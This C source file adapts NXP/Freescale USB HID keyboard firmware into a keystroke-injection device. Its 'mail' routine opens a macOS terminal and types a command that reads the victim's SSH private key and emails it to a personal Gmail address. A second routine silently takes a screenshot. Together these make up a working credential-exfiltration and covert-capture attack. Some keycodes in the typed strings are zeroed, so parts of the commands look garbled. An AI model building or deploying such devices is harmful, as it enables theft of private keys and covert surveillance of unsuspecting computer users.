/*
 * The Clear BSD License
 * Copyright (c) 2015, Freescale Semiconductor, Inc.
 * Copyright 2016 NXP
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification,
 * are permitted (subject to the limitations in the disclaimer below) provided
 * that the following conditions are met:
 *
 * o Redistributions of source code must retain the above copyright notice, this list
 *   of conditions and the following disclaimer.
 *
 * o Redistributions in binary form must reproduce the above copyright notice, this
 *   list of conditions and the following disclaimer in the documentation and/or
 *   other materials provided with the distribution.
 *
 * o Neither the name of the copyright holder nor the names of its
 *   contributors may be used to endorse or promote products derived from this
 *   software without specific prior written permission.
 *
 * NO EXPRESS OR IMPLIED LICENSES TO ANY PARTY'S PATENT RIGHTS ARE GRANTED BY THIS LICENSE.
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
 * ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "usb_device_config.h"
#include "usb.h"
#include "usb_device.h"

#include "usb_device_class.h"
#include "usb_device_hid.h"

#include "usb_device_ch9.h"
#include "usb_device_descriptor.h"

#include "composite.h"

#include "hid_keyboard.h"

/*******************************************************************************
 * Definitions
 ******************************************************************************/
typedef struct key_struct
{
	uint8_t modifier;
	uint8_t key;
} key_struct_t ;

#define KEY_TAB_LENGHT 100
#define ITERATIONS_TO_WAIT 10

static enum operation typeOfExecutedOperation = none;

static uint8_t key_tab_index = 0;
/*******************************************************************************
 * Prototypes
 ******************************************************************************/

static usb_status_t USB_DeviceHidKeyboardAction(void);

/*******************************************************************************
 * Variables
 ******************************************************************************/

USB_DMA_NONINIT_DATA_ALIGN(USB_DATA_ALIGN_SIZE) static uint8_t s_KeyboardBuffer[USB_HID_KEYBOARD_REPORT_LENGTH];
static usb_device_composite_struct_t *s_UsbDeviceComposite;
static usb_device_hid_keyboard_struct_t s_UsbDeviceHidKeyboard;

/*******************************************************************************
 * Code
 ******************************************************************************/
void askToSendMail (void) {
	typeOfExecutedOperation = mail;
	key_tab_index = 0;
}
void askToPrintscreen (void) {
	typeOfExecutedOperation = printscreen;
	key_tab_index = 0;
}

static usb_status_t USB_DeviceHidKeyboardAction(void)
{
	//inicjalizing the table of characters
	key_struct_t key_tab[KEY_TAB_LENGHT] = {{0,0}};

	//writing own characters
	switch (typeOfExecutedOperation) {
	/* implementing keys for sending an email */
	/* used formula: cat ~/.ssh/id_rsa | mail -s 'key' magdalena.anna.pikul@gmail.com */
	case mail:
		key_tab[0].modifier = MODIFERKEYS_LEFT_GUI; key_tab[0].key = KEY_SPACEBAR;
		key_tab[1].modifier = 0x00; key_tab[1].key = KEY_T;
		key_tab[2].key = KEY_E;
		key_tab[3].key = KEY_R;
		key_tab[4].key = KEY_M;
		key_tab[5].key = KEY_I;
		key_tab[6].key = KEY_N;
		key_tab[7].key = KEY_A;
		key_tab[8].key = KEY_L;
		key_tab[9].key = KEY_ENTER;

		key_tab[10].key = 0X00;
		key_tab[11].key = 0X00;
		key_tab[12].key = 0X00;
		key_tab[13].key = 0X00;
		key_tab[14].key = 0X00;
		key_tab[15].key = 0X00;
		key_tab[16].key = 0X00;

		key_tab[19].key = KEY_SPACEBAR;
		key_tab[20].key = KEY_C;
		key_tab[21].key = KEY_A;
		key_tab[22].key = KEY_T;
		key_tab[23].key = KEY_SPACEBAR;

		key_tab[24].modifier = MODIFERKEYS_LEFT_SHIFT; key_tab[24].key = KEY_GRAVE_ACCENT_AND_TILDE;
		key_tab[25].key = KEY_SLASH_QUESTION;
		key_tab[26].key = KEY_DOT_GREATER;
		key_tab[27].key = KEY_S;
		key_tab[28].key = 0x00;
		key_tab[29].key = KEY_S;
		key_tab[30].key = KEY_H;
		key_tab[31].key = KEY_SLASH_QUESTION;
		key_tab[32].key = KEY_I;
		key_tab[33].key = KEY_D;
		key_tab[34].modifier = MODIFERKEYS_LEFT_SHIFT; key_tab[34].key = KEY_MINUS_UNDERSCORE;
		key_tab[35].key = KEY_R;
		key_tab[36].key = KEY_S;
		key_tab[37].key = KEY_A;
		key_tab[38].key = KEY_SPACEBAR;

		key_tab[39].modifier = MODIFERKEYS_LEFT_SHIFT; key_tab[39].key = KEY_BACKSLASH_VERTICAL_BAR;
		key_tab[40].key = KEY_SPACEBAR;

		key_tab[41].key = KEY_M;
		key_tab[42].key = KEY_A;
		key_tab[43].key = KEY_I;
		key_tab[44].key = KEY_L;
		key_tab[45].key = KEY_SPACEBAR;

		key_tab[46].key = KEY_MINUS_UNDERSCORE;
		key_tab[47].key = KEY_S;
		key_tab[48].key = KEY_SPACEBAR;

		key_tab[49].key = KEY_SINGLE_AND_DOUBLE_QUOTE;
		key_tab[50].key = KEY_K;
		key_tab[51].key = KEY_E;
		key_tab[52].key = KEY_Y;
		key_tab[53].key = KEY_SINGLE_AND_DOUBLE_QUOTE;
		key_tab[54].key = KEY_SPACEBAR;

		key_tab[55].key = KEY_M;
		key_tab[56].key = KEY_A;
		key_tab[57].key = KEY_G;
		key_tab[58].key = KEY_D;
		key_tab[59].key = KEY_A;
		key_tab[60].key = KEY_L;
		key_tab[61].key = KEY_E;
		key_tab[62].key = KEY_N;
		key_tab[63].key = KEY_A;
		key_tab[64].key = KEY_DOT_GREATER;
		key_tab[65].key = KEY_A;
		key_tab[66].key = KEY_N;
		key_tab[67].key = 0X00;
		key_tab[68].key = KEY_N;
		key_tab[69].key = KEY_A;
		key_tab[70].key = KEY_DOT_GREATER;
		key_tab[71].key = KEY_P;
		key_tab[72].key = KEY_I;
		key_tab[73].key = KEY_K;
		key_tab[74].key = KEY_U;
		key_tab[75].key = KEY_L;
		key_tab[76].modifier = MODIFERKEYS_LEFT_SHIFT; key_tab[76].key = KEY_2_AT;
		key_tab[77].key = KEY_G;
		key_tab[78].key = KEY_M;
		key_tab[79].key = KEY_A;
		key_tab[80].key = KEY_I;
		key_tab[81].key = KEY_L;
		key_tab[82].key = KEY_DOT_GREATER;
		key_tab[83].key = KEY_C;
		key_tab[84].key = KEY_O;
		key_tab[85].key = KEY_M;
		key_tab[86].key = KEY_ENTER;


		break;
	/* implementing keys for taking printscreen */
	/* used formula: screencapture -x quiet.jpg */
	case printscreen:
		key_tab[0].modifier = MODIFERKEYS_LEFT_GUI; key_tab[0].key = KEY_SPACEBAR;
		key_tab[1].key = KEY_T;
		key_tab[2].key = KEY_E;
		key_tab[3].key = KEY_R;
		key_tab[4].key = KEY_M;
		key_tab[5].key = KEY_I;
		key_tab[6].key = KEY_N;
		key_tab[7].key = KEY_A;
		key_tab[8].key = KEY_L;
		key_tab[9].key = KEY_ENTER;

		key_tab[10].key = 0X00;
		key_tab[11].key = 0X00;
		key_tab[12].key = 0X00;
		key_tab[13].key = 0X00;
		key_tab[14].key = 0X00;
		key_tab[15].key = 0X00;
		key_tab[16].key = 0X00;

		key_tab[20].key = KEY_S;
		key_tab[21].key = KEY_C;
		key_tab[22].key = KEY_R;
		key_tab[23].key = KEY_E;

		key_tab[24].key = 0X00;
		key_tab[25].key = KEY_E;
		key_tab[26].key = KEY_N;
		key_tab[27].key = KEY_C;
		key_tab[28].key = KEY_A;
		key_tab[29].key = KEY_P;
		key_tab[30].key = KEY_T;
		key_tab[31].key = KEY_U;
		key_tab[32].key = KEY_R;
		key_tab[33].key = KEY_E;
		key_tab[34].key = KEY_SPACEBAR;

		key_tab[35].key = KEY_MINUS_UNDERSCORE;
		key_tab[36].key = KEY_X;
		key_tab[37].key = KEY_SPACEBAR;

		key_tab[38].key = KEY_Q;
		key_tab[39].key = KEY_U;
		key_tab[40].key = KEY_I;
		key_tab[41].key = KEY_E;
		key_tab[42].key = KEY_T;
		key_tab[43].key = KEY_DOT_GREATER;
		key_tab[44].key = KEY_J;
		key_tab[45].key = KEY_P;
		key_tab[46].key = KEY_G;
		key_tab[47].key = KEY_ENTER;

		break;
	case none:
		break;
	}

	static uint16_t counter = 0U;

	//setting default values to send (nothing to send)
	s_UsbDeviceHidKeyboard.buffer[0] = 0x00U;
	s_UsbDeviceHidKeyboard.buffer[2] = 0x00U;

	//waiting between sending our characters
	counter++;
	if (counter == ITERATIONS_TO_WAIT) {
		s_UsbDeviceHidKeyboard.buffer[0] = key_tab[key_tab_index].modifier;
		s_UsbDeviceHidKeyboard.buffer[2] = key_tab[key_tab_index].key;
		key_tab_index++;
		counter = 0;
	}
	//making program working in a loop
	if (key_tab_index >= KEY_TAB_LENGHT) {
		key_tab_index = 0;
		typeOfExecutedOperation = none;
	}
	//key stroke
	return USB_DeviceHidSend(s_UsbDeviceComposite->hidKeyboardHandle, USB_HID_KEYBOARD_ENDPOINT_IN,
	                             s_UsbDeviceHidKeyboard.buffer, USB_HID_KEYBOARD_REPORT_LENGTH);
}

usb_status_t USB_DeviceHidKeyboardCallback(class_handle_t handle, uint32_t event, void *param)
{
    usb_status_t error = kStatus_USB_Error;

    switch (event)
    {
        case kUSB_DeviceHidEventSendResponse:
            if (s_UsbDeviceComposite->attach)
            {
                return USB_DeviceHidKeyboardAction();
            }
            break;
        case kUSB_DeviceHidEventGetReport:
        case kUSB_DeviceHidEventSetReport:
        case kUSB_DeviceHidEventRequestReportBuffer:
            error = kStatus_USB_InvalidRequest;
            break;
        case kUSB_DeviceHidEventGetIdle:
        case kUSB_DeviceHidEventGetProtocol:
        case kUSB_DeviceHidEventSetIdle:
        case kUSB_DeviceHidEventSetProtocol:
            break;
        default:
            break;
    }

    return error;
}

usb_status_t USB_DeviceHidKeyboardSetConfigure(class_handle_t handle, uint8_t configure)
{
    if (USB_COMPOSITE_CONFIGURE_INDEX == configure)
    {
        return USB_DeviceHidKeyboardAction(); /* run the cursor movement code */
    }
    return kStatus_USB_Error;
}

usb_status_t USB_DeviceHidKeyboardSetInterface(class_handle_t handle, uint8_t interface, uint8_t alternateSetting)
{
    if (USB_HID_KEYBOARD_INTERFACE_INDEX == interface)
    {
        return USB_DeviceHidKeyboardAction(); /* run the cursor movement code */
    }
    return kStatus_USB_Error;
}

usb_status_t USB_DeviceHidKeyboardInit(usb_device_composite_struct_t *deviceComposite)
{
    s_UsbDeviceComposite = deviceComposite;
    s_UsbDeviceHidKeyboard.buffer = s_KeyboardBuffer;
    return kStatus_USB_Success;
}
